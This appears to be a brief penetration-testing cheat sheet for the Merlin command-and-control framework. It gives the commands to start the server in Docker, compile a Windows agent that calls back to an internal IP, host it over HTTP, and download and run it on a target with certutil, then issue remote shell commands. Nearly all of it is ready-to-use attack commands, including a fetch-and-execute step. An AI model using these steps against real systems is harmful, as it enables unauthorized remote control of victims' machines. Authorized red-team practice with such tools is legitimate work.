#### 1. About

- URL: `https://github.com/Ne0nd0g/merlin`
- Go tool for multi-platform CC server


#### 2. Setup server
```
# docker pull golang
# docker run --name merlin --rm -it -v /tmp/merlin:/tmp/merlin -p443:443 golang
# go get github.com/Ne0nd0g/merlin 2>/dev/null
# ln -s $GOPATH/src/github.com/Ne0nd0g/merlin /merlin
# cd /merlin/data/x509/
# openssl req -x509 -days 7 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out server.crt -subj "/CN=LOL"
# cd /merlin && go run cmd/merlinserver/main.go -i 0.0.0.0
```


#### 3. Setup agent
```
# docker exec -it merlin bash
# cd /merlin/cmd/merlinagent
# GOOS=windows GOARCH=386 go build -ldflags "-X main.url=https://192.168.9.11" -o /tmp/merlin/agent.exe main.go
```
Note: `https://github.com/Ne0nd0g/merlin/blob/master/data/bin/README.MD`


#### 4. Example

1. Deploy
```
# cd /tmp/merlin && python -m SimpleHTTPServer 8888
C:\Windows\Temp>certutil -urlcache -split -f http://192.168.9.11:8888/agent.exe agent.exe
C:\Windows\Temp>cmd.exe /c agent.exe
```

2. Run
```
Merlin[agent][2d0f28a4-e2f0-4f9a-9e2d-1438ab04fe70]» shell systeminfo
```
